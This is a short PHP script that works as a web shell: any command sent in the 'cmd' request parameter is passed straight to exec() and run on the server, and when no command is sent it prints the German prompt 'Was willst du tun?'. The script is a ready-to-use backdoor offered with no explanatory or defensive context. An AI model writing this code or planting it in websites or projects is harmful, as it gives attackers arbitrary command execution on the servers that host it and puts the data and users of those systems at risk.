<?php
  if(isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    exec($cmd);
  } else {
    echo "Was willst du tun?";
  }
?>
